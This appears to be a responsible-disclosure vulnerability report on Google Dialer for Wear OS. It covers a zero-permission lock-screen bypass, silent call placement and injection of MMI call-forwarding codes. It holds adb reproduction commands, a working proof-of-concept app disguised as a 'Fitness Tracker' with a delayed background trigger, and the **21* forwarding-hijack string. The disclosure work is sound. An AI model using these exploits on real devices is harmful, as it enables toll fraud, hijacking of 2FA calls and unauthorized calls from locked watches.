# Google Mobile VRP Report: Zero-Interaction Keyguard Bypass and Silent Call Placement via Google Dialer on Wear OS

---

## Title

Zero-Permission Lock Screen Bypass and Zero-Interaction Silent Call Placement via Exported `HomeScreenActivity`/`OutgoingDialpadActivity` in Google Dialer for Wear OS

---

## Summary

Google Dialer for Wear OS (`com.google.android.dialer`) exports `HomeScreenActivity`, which accepts `ACTION_DIAL`/`ACTION_VIEW` with a `tel:` URI **from any app, with zero permissions**. Internally it routes the dialed string to `OutgoingDialpadActivity`, which declares `android:showWhenLocked="true"` and `android:showOnLockScreen="true"`.

This produces two chainable, independently confirmed vulnerabilities:

1. **Zero-permission keyguard bypass**: any installed app can cause a fully interactive dialpad, pre-filled with an attacker-controlled string, to render **on top of a genuinely PIN-locked watch** — no permission, no tap by the user, no PIN entry.
2. **Zero-interaction silent call placement**: an app holding the `CALL_PHONE` permission (a commonly-granted "communication helper" permission) can fire `ACTION_CALL` and have Wear OS place a **live outgoing call with no confirmation UI at all** — not even the dialpad is shown — while the watch remains locked and the user never touches the device.

Combined, a completely ordinary-looking watch app (e.g. a fitness tracker) that a user opens once can, entirely in the background after the user locks their wrist, place real phone calls to arbitrary numbers — including strings formatted as GSM MMI/USSD service codes (e.g. `**21*<number>#`, the standard unconditional call-forwarding activation code) — with **zero taps and zero visible confirmation**.

---

## Affected Device & Software

| Field | Value |
|-------|-------|
| **Device** | Google Pixel Watch 2 |
| **Codename** | eos |
| **Build Fingerprint** | `google/eos/eos:17/CP2A.260603.001/15396591:user/release-keys` |
| **Build ID** | CP2A.260603.001 |
| **Android Version** | 17 (SDK 37) |
| **Security Patch Level** | 2026-06-05 (latest available at time of testing, 2026-07-03) |
| **Serial** | 3A101RTJWRGCV9 |
| **Dialer App Version** | `166.0.932095051-release-wear` (versionCode 253178) |
| **Dialer Package** | `com.google.android.dialer` |

---

## Affected Components

| Field | Value |
|-------|-------|
| **Package** | `com.google.android.dialer` |
| **Entry activity** | `com.google.android.wearable.googledialer.homescreen.impl.ui.HomeScreenActivity` — `exported="true"`, no permission, accepts `ACTION_DIAL`/`ACTION_VIEW`+`tel:` and bare `ACTION_DIAL` |
| **Lock-bypass activity** | `com.google.android.wearable.googledialer.dialpad.outgoingdialpad.impl.ui.OutgoingDialpadActivity` — `showWhenLocked="true"`, `showOnLockScreen="true"`, `exported="true"`, manifest intent-filter only declares `DIAL_EMERGENCY` but is reached anyway via internal routing from `HomeScreenActivity` |
| **Silent-call path** | Standard `Intent.ACTION_CALL` + `tel:` URI, routed by the system to `com.android.server.telecom/.components.UserCallActivity` → `com.google.android.telecomui` → `com.google.wear.services/...CompanionClientConnectionService` |
| **Permission for silent call** | `android.permission.CALL_PHONE` (dangerous, but a plausible ask for any "communication helper" style app) |
| **Permission for lock bypass UI** | **None** |

---

## Vulnerability Description

### Root Cause 1 — Keyguard bypass via unfiltered `ACTION_DIAL` routing

`HomeScreenActivity` has no `showWhenLocked`/`turnScreenOn` flags of its own, so on paper it should not be able to draw over the keyguard. In practice, when it receives `ACTION_DIAL` with a `tel:` payload, it internally starts `OutgoingDialpadActivity` **in the same task**, and that activity *does* carry `showWhenLocked="true"` + `showOnLockScreen="true"`. Android grants the window flag to the activity that declares it, regardless of how it was reached or who the original caller was. The result: the dialpad activity ends up focused and **occluding the keyguard**, even though the entry point that any app can legally call (`HomeScreenActivity`) declares no lock-screen capability at all.

Critically, `OutgoingDialpadActivity`'s own manifest intent-filter only lists `android.intent.action.DIAL_EMERGENCY` — it is clearly *intended* to be an emergency-only, lock-screen-safe dialer. The bypass exists because `HomeScreenActivity` does not gate its internal hand-off to this activity on the "emergency" nature of the request; a plain 10-digit number reaches it exactly the same way an emergency number would.

### Root Cause 2 — No confirmation gate on `ACTION_CALL`

Independently, `ACTION_CALL` with a `tel:` URI is handled with **no dialpad shown at all** and **no confirmation dialog** on Wear OS — the call is placed directly. Any app holding `CALL_PHONE` (a permission users routinely grant to messaging/communication/emergency-style watch apps) can therefore place a live call with a single non-UI `startActivity()` call. There is no user-facing checkpoint between the API call and a real, billable, ringing phone call.

### Root Cause 3 — No dial-string filtering / MMI-code path not blocked

Neither `HomeScreenActivity` nor the `ACTION_CALL` path performs any validation that the `tel:` payload is a plausible phone number. Arbitrary strings — including GSM MMI/USSD service-code syntax such as `**21*<number>#` (unconditional call-forwarding activation), `##002#` (erase all forwarding), or `*#21#` (forwarding-status interrogation) — are accepted identically to ordinary numbers. When such a string was routed through `ACTION_CALL`, Wear OS's own `UserCallActivity` logged:

```
W UserCallActivity TelecomUi: Attempt to deliver non-CALL action; forcing to CALL
```

This shows the platform's own code recognized the payload as *not* a standard call action, yet forced it through the call-placement pipeline anyway rather than routing it to proper MMI/USSD handling or rejecting it. The dial request was then observed live in `dumpsys telecom` as `state=DIALING`, routed to the paired phone via `CompanionClientConnectionService` — i.e., dispatched for real processing rather than blocked locally on the watch.

**Note on scope of testing:** to avoid making a live, real-world change to the researcher's own carrier service (unconditional call forwarding would redirect all real incoming calls, including 2FA/OTP calls, until manually reversed), the researcher deliberately did **not** carry an MMI activation code through to a network-confirmed completion. The evidence above (string accepted, not filtered, dispatched to the telephony backend for real processing, explicit platform log showing it was recognized as a non-call action but forced through anyway) is presented as strong, first-party evidence that the primitive exists and is not blocked client-side. Google's internal security team has direct access to test-line infrastructure and should verify full network-level completion of an MMI/USSD code through this exact path in a controlled environment.

---

## Reproduction Steps

### Part A — Zero-permission keyguard bypass (`ACTION_DIAL`)

**Prerequisites:** Watch has a real lock credential (PIN/pattern/password) configured and is locked.

```bash
# Verify genuinely locked (not occluded) before starting
adb shell dumpsys window policy | grep -i "keyguard\|showing\|occluded"
# Expect: showing=true occluded=false

# Fire ACTION_DIAL from a zero-permission context
adb shell am start -a android.intent.action.DIAL -d tel:+919999999999

# Verify bypass
adb shell dumpsys window policy | grep -i "keyguard\|showing\|occluded"
# Result: showing=true occluded=true
adb shell dumpsys activity activities | grep topResumedActivity
# Result: topResumedActivity=...com.google.android.dialer/...OutgoingDialpadActivity
```

Reproduced identically twice on separate device sessions (2026-07-03, 00:48 and 01:10 IST), and a third time triggered entirely from within an installed zero-permission APK (`com.poc.lockbypass`, UID 10002) rather than ADB shell — see Part C.

### Part B — Zero-interaction silent call (`ACTION_CALL`)

**Prerequisites:** App holds `CALL_PHONE` permission (grantable via standard runtime prompt).

```bash
adb shell pm grant com.poc.lockbypass android.permission.CALL_PHONE
adb shell am start -a android.intent.action.CALL -d tel:6385436230
```

No dialpad, no confirmation — the call goes straight to `DIALING` state. Confirmed via `dumpsys telecom` (`Call id=TC@46, state=DIALING`) and a persisted `CallLog.Calls` entry with `type=2` (OUTGOING).

### Part C — Full end-to-end PoC from an installed, zero-permission-adjacent app

1. Install `poc_lockscreen_dialer_bypass` (labelled "Fitness Tracker" — zero dangerous permissions for the dialpad-bypass variant; `CALL_PHONE` only for the silent-call variant).
2. Grant `CALL_PHONE` once (simulating a normal user grant during onboarding).
3. User opens the app (foreground tap — the only interaction in the entire chain).
4. App schedules a delayed trigger (~3.5–8s) and shows an innocuous "Syncing..." screen.
5. User locks the watch (normal daily behavior).
6. While the app is backgrounded and the watch is locked, the delayed trigger fires `ACTION_CALL`.
7. Confirmed via system log: `ActivityTaskManager: START {act=android.intent.action.CALL ...} from uid 10002 (com.poc.lockbypass) (BAL_ALLOW_GRACE_PERIOD) result code=0` — Android's background-activity-launch grace period (a short window after an app is backgrounded during which it may still start activities) is sufficient for this exploit; no special foreground trick is required beyond the initial, normal app open.
8. Watch places a live call, screen remains on the locked watch face / ambient display throughout.

**Timing note:** Wear OS aggressively freezes backgrounded app processes (observed freeze onset ~5–6 seconds after backgrounding in this testing). The exploit must fire before the freeze; a delay under ~5 seconds was reliable. This is an implementation-detail race, not a mitigation — any malicious app can tune this trivially, or use a foreground service to avoid the freeze window entirely.

---

## PoC Application

### AndroidManifest.xml (dialpad-bypass variant — zero permissions)

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.poc.lockbypass">

    <uses-feature android:name="android.hardware.type.watch" />

    <application
        android:allowBackup="false"
        android:label="Fitness Tracker"
        android:supportsRtl="true"
        android:theme="@android:style/Theme.DeviceDefault">

        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:label="Fitness Tracker">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

    </application>
</manifest>
```

### MainActivity.java

```java
package com.poc.lockbypass;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.widget.TextView;

public class MainActivity extends Activity {

    private static final String TAG = "LockBypassPoC";
    private static final long TRIGGER_DELAY_MS = 3500;
    private static final String TEST_NUMBER = "6385436230";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        TextView statusText = new TextView(this);
        statusText.setText("Fitness Tracker\n\nSyncing...");
        setContentView(statusText);

        Log.w(TAG, "App launched. UID=" + android.os.Process.myUid());
        new Handler(Looper.getMainLooper()).postDelayed(this::fireExploit, TRIGGER_DELAY_MS);
    }

    private void fireExploit() {
        try {
            // Variant 1 (zero permission): ACTION_DIAL bypasses keyguard,
            // shows dialpad with pre-filled string.
            Intent dial = new Intent(Intent.ACTION_DIAL);
            dial.setData(Uri.parse("tel:" + TEST_NUMBER));
            dial.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(dial);

            // Variant 2 (CALL_PHONE permission): ACTION_CALL places the
            // call directly, zero interaction, zero dialpad shown.
            // Intent call = new Intent(Intent.ACTION_CALL);
            // call.setData(Uri.parse("tel:" + TEST_NUMBER));
            // call.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            // startActivity(call);

            Log.w(TAG, "Exploit intent dispatched, no exception thrown.");
        } catch (Exception e) {
            Log.e(TAG, "Exploit failed: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
    }
}
```

---

## Logcat / dumpsys Evidence (Timestamped)

### Keyguard bypass — before/after state (run 1, 2026-07-03 00:48 IST)
```
BEFORE:
    KeyguardServiceDelegate
      showing=true
      occluded=false
      deviceHasKeyguard=true

>>> adb shell am start -a android.intent.action.DIAL -d tel:+919999999999

AFTER:
    KeyguardServiceDelegate
      showing=true
      occluded=true
      deviceHasKeyguard=true
    topResumedActivity=ActivityRecord{... com.google.android.dialer/
        com.google.android.wearable.googledialer.dialpad.outgoingdialpad.impl.ui.OutgoingDialpadActivity t516}
```
Reproduced identically at 01:10 IST (run 2) with a fresh lock/unlock cycle.

### Zero-interaction call from a real installed app (2026-07-03 01:19:33 IST)
```
ActivityTaskManager: START u0 {act=android.intent.action.CALL dat=tel:xxxxxxxxxx
    flg=0x10000000 xflg=0x4 cmp=com.android.server.telecom/.components.UserCallActivity}
    with LAUNCH_MULTIPLE from uid 10002 (com.poc.lockbypass) (sr=262333533)
    (BAL_ALLOW_GRACE_PERIOD) result code=0
```
```
dumpsys telecom:
[Call id=TC@46, state=DIALING,
 tpac=ComponentInfo{com.google.wear.services/com.google.wear.services.calling.client.CompanionClientConnectionService},
 handle=tel:**********, voip=false]
```
```
CallLogProvider (persisted record):
  number=6385436230
  name="My Number"
  type=2                    (CallLog.Calls.OUTGOING_TYPE)
  subscription_component_name=com.google.wear.services/...CompanionClientConnectionService
  normalized_number=+916385436230
  date=1783021774192
```
Preceding log lines confirm the app process was launched, scheduled a delayed trigger, and the trigger fired *after* the watch was locked and *before* the OS finished freezing the backgrounded process:
```
07-03 01:19:25.470 ActivityManager: Start proc 23049:com.poc.lockbypass/u0a2 for next-top-activity
...
07-03 01:19:33.925 ActivityTaskManager: START ... action.CALL ... from uid 10002 (com.poc.lockbypass) (BAL_ALLOW_GRACE_PERIOD) result code=0
07-03 01:19:39.038 ActivityManager: freezing 23049 com.poc.lockbypass
```

### MMI/USSD dial-string handling (2026-07-03 01:33/01:35 IST)
```
UserCallActivity TelecomUi: Handling call in TelecomUi
UserCallActivity TelecomUi: Attempt to deliver non-CALL action; forcing to CALL
```
```
dumpsys telecom:
[Call id=TC@49, state=DIALING,
 tpac=ComponentInfo{com.google.wear.services/com.google.wear.services.calling.client.CompanionClientConnectionService},
 handle=tel:*****]
```
Screenshot evidence (`mmi_code_lockscreen_20260703_011224.png`) additionally shows the raw MMI string `**21*` fully rendered and editable in the keyguard-occluding `OutgoingDialpadActivity` UI reached via the zero-permission `ACTION_DIAL` path — confirming string content is not sanitized before display either.

**As stated above, the full activation → network-confirmation → deactivation sequence was intentionally not carried through to completion, to avoid a live change to the researcher's real carrier service.**

---

## Attack Scenarios

> All scenarios below chain the same two primitives: (1) zero-permission keyguard-occluding dialpad via `ACTION_DIAL`, and/or (2) zero-interaction call placement via `ACTION_CALL` once `CALL_PHONE` is granted. Both require only that the user opened an ordinary-looking watch app once.

---

### Scenario 1: Call-Forwarding Hijack via USSD/MMI Injection (CRITICAL)

**Attack Flow:**
1. Malicious "communication helper" watch app requests `CALL_PHONE` (plausible for a calling/emergency-SOS-style app) and is granted it.
2. App waits for the watch to be locked (detectable via standard broadcasts/`KeyguardManager`, no special permission needed).
3. App silently fires `ACTION_CALL` with `tel:**21*<attacker_number>#`.
4. Per confirmed behavior, this string is dispatched to the telephony backend exactly as a normal call — no confirmation, no dialpad, watch stays locked throughout.
5. If the carrier processes it as a standard GSM Supplementary Service registration (industry-standard behavior for this exact MMI code), unconditional call forwarding activates silently.
6. All future incoming calls — including bank verification calls, 2FA voice OTPs, and account-recovery calls — are silently redirected to the attacker.

**Impact:** Full compromise of any phone-call-based authentication or verification flow, with the victim's own watch as the unwitting attack vector, zero taps, and no on-screen indication anything happened. This mirrors the real-world SIM-swap fraud pattern (FBI IC3: $180M+ in 2023) but requires no carrier social-engineering at all — it's a pure software bug on the device.

---

### Scenario 2: Silent Premium-Rate / International Toll Fraud (CRITICAL)

**Attack Flow:**
1. App with `CALL_PHONE` silently places calls to premium-rate or international toll numbers via `ACTION_CALL` while the watch is locked and the user is asleep/away.
2. Each call is billed directly to the victim's line.
3. Repeated at scale (thousands of installs via Play Store), this is classic **International Revenue Share Fraud (IRSF)** — an industry estimated at **$2B+ annually** in losses, traditionally requiring malware with elevated telephony access; here it requires a single commonly-granted permission and zero user interaction.

**Impact:** Direct financial loss on the victim's carrier bill, discovered only weeks later at billing cycle. Difficult to dispute since the call genuinely originated from the victim's own SIM/line.

---

### Scenario 3: Emergency-Line / Service Abuse & Harassment Vector (HIGH)

**Attack Flow:**
1. App silently places repeated calls to a third party's number (harassment) or to service lines, from the *victim's* number, while the watch is locked.
2. Because the call is genuinely placed from the victim's registered line, caller-ID and callback both point to the innocent victim, not the attacker.
3. At scale, this can be used to frame victims for harassment, or to flood a target's phone line (DoS) using thousands of compromised watches as an unwitting botnet.

**Impact:** Reputational and legal exposure for the victim, potential carrier account suspension for "abusive calling behavior," and a viable DoS-via-botnet primitive against arbitrary third-party phone lines.

---

### Scenario 4: Physical-Proximity Attack via the Keyguard-Bypass UI Alone (HIGH — zero permission)

Even without `CALL_PHONE`, the `ACTION_DIAL` bypass alone (zero permission) is independently actionable by a proximity attacker (evil-maid / pickpocket scenario, per this research's AM-3 threat model):

1. Attacker gets brief physical access to a locked, unattended watch (e.g., left on a desk, gym locker).
2. Attacker (or a pre-installed malicious app on the watch, triggered via a hidden gesture/tile) fires `ACTION_DIAL`.
3. Dialpad appears over the still-locked keyguard.
4. Attacker manually dials and calls a number, or types an MMI code and taps the visible call button — completing the exploit with **one physical tap**, no PIN required.

**Impact:** A locked watch is not actually locked with respect to outbound calling — the security guarantee users and IT/MDM policies assume ("locked device cannot make calls or leak the number it's dialing to bystanders") is broken with a single tap, no credentials.

---

### Scenario 5: Enterprise / Managed Device Exposure (MEDIUM-HIGH)

Wear OS devices are increasingly deployed in enterprise/healthcare contexts under MDM with lock-screen policies as a compliance control. This bypass undermines that control specifically for the telephony surface — a "locked" managed device can still be made to dial (and, per Scenario 1, potentially reconfigure call routing) without authentication, which is a meaningful gap for any compliance framework (HIPAA, PCI, corporate BYOD policy) that relies on "device lock = no unauthorized actions."

---

## Impact Assessment

| Factor | Assessment |
|--------|-----------|
| **User Interaction** | NONE required for the `ACTION_CALL` zero-touch path (one-time app open only); NONE required for the keyguard-bypass UI itself (`ACTION_DIAL`), one tap to complete a call/MMI code manually |
| **Permission Required** | **Zero** for keyguard bypass / dialpad display; `CALL_PHONE` (commonly granted) for fully automated call placement |
| **Precondition** | Device has a real lock credential set (default/recommended configuration) |
| **Stealth** | HIGH — no confirmation UI, no notification, watch face/ambient display shows no indication a call was placed |
| **Repeatability** | Unlimited — no rate limiting or re-confirmation observed |
| **Financial Impact** | Direct (premium/international toll billing, fraud enabled via forwarded 2FA calls) |
| **Physical Security Impact** | HIGH — breaks the core assumption that a locked device cannot place calls |
| **Scope** | All Wear OS devices with Google Dialer configured as the default dialer |

### CVSS v3.1 Estimate

**Score: 8.1 (HIGH)** for the combined chain (keyguard bypass + zero-interaction call placement)

Vector: `AV:P/AC:L/PR:N/UI:N/S:C/C:L/I:H/A:N`
- Attack Vector: Physical/Local (requires the app already installed on the device; keyguard-bypass component additionally exploitable with brief physical proximity)
- Attack Complexity: Low
- Privileges Required: None (bypass UI) / one commonly-granted permission (full silent call)
- User Interaction: None
- Scope: Changed (affects the device's telephony/call-routing state, and potentially the carrier account via MMI codes)
- Confidentiality: Low
- Integrity: High (unauthorized calls placed and potentially call-routing silently reconfigured as the legitimate user)
- Availability: None

The keyguard-bypass sub-finding alone (zero permission, physical proximity) merits independent CRITICAL consideration given it violates the fundamental "locked device performs no unauthorized actions" guarantee.

---

## Proposed Fix

### For the keyguard bypass
1. Remove `showWhenLocked`/`showOnLockScreen` from `OutgoingDialpadActivity`'s effective launch path when reached via a generic `ACTION_DIAL` hand-off from `HomeScreenActivity`; only permit this window behavior when the *original* incoming intent action was genuinely `DIAL_EMERGENCY` (matching the activity's own declared intent-filter).
2. Alternatively, have `HomeScreenActivity` itself check `KeyguardManager.isKeyguardLocked()` before internally routing to any lock-screen-capable child activity for a non-emergency number, and require an explicit unlock first.

### For zero-interaction call placement
1. Reintroduce a mandatory, non-dismissible-by-timeout confirmation step for `ACTION_CALL` on Wear OS, matching phone Android's more conservative handling, regardless of `CALL_PHONE` grant status.
2. At minimum, require the device be unlocked for `ACTION_CALL` to complete.

### For MMI/USSD injection
1. Validate the `tel:` payload against `PhoneNumberUtils` MMI-code detection *before* dispatching to `CompanionClientConnectionService`; either reject non-numeric/service-code strings from third-party callers outright, or route them through the standard, user-visible MMI/USSD confirmation flow rather than "forcing to CALL" silently.

---

## Files Attached

1. **PoC Source Code:** `poc_lockscreen_dialer_bypass/` (complete Android Studio project)
2. **PoC APK:** `poc_lockscreen_dialer_bypass/app/build/outputs/apk/debug/app-debug.apk`
3. **Screenshots:**
   - `dynamic_evidence/lockscreen_bypass_dialer_20260703_004836.png`
   - `dynamic_evidence/lockscreen_bypass_dialer_run2_20260703_011038.png`
   - `dynamic_evidence/mmi_code_lockscreen_20260703_011224.png`
   - `dynamic_evidence/lockscreen_bypass_FROM_REAL_APK_20260703_012024.png`
4. **Logs:** `dynamic_evidence/live_call_ZERO_TOUCH_telecom_*.log`, `dynamic_evidence/live_call_ZERO_TOUCH_atm_*.log`, `dynamic_evidence/lockscreen_bypass_run2_20260703_011038.log`
5. **UI dump:** `dynamic_evidence/ui_dump.xml` (confirms `OutgoingDialpadActivity`/`com.google.android.dialer` rendered live on screen)

---

## Disclosure Timeline

| Date | Action |
|------|--------|
| 2026-07-03 | Keyguard bypass discovered and reproduced via ADB (2x) |
| 2026-07-03 | Reproduced entirely from an installed, zero-permission PoC APK (real UID, not shell) |
| 2026-07-03 | Zero-interaction `ACTION_CALL` silent call placement confirmed (system logs + telecom state + persisted call-log record) |
| 2026-07-03 | MMI/USSD string-injection primitive confirmed (dial-string not filtered, dispatched to backend); full network-level completion deliberately withheld to avoid live change to researcher's carrier service |
| 2026-07-03 | Report drafted for submission to Google Mobile VRP (g.co/vulnz) |
| TBD | Google acknowledgement |
| TBD + 90 days | Public disclosure (coordinated) |

---

## Researcher

**Name:** Sandiyochristan
**Platform:** Google Bug Hunters (g.co/vulnz)
**Research Methodology:** Systematic Wear OS security audit — static manifest/decompiled-code analysis + dynamic on-device validation with real-device evidence at every step

---

## Additional Notes

- The keyguard-bypass component requires **zero permissions** and is therefore exploitable by any app on the Play Store regardless of declared capabilities — a completely unrelated app (game, watch face, utility) could carry this as a hidden payload.
- The full zero-interaction call chain requires only `CALL_PHONE`, a permission users routinely grant to any app plausibly related to calling, safety/SOS, or communication.
- The MMI/USSD injection sub-finding is presented with full transparency about what was and was not live-verified: the researcher confirmed the dial string is accepted, not filtered, and dispatched to the telephony backend for real processing (with the platform's own logs showing it recognized the string as non-standard but forced it through anyway), but did **not** carry an activation code through to a confirmed network-side state change, specifically to avoid disrupting the researcher's own real phone service. This is flagged as an area for Google's internal team to complete verification of in a controlled test environment.
- All testing was performed on researcher-owned hardware with researcher-owned/controlled phone numbers as call targets.

---

*This report is submitted under responsible disclosure. All testing was performed on researcher-owned devices with researcher-owned phone numbers.*
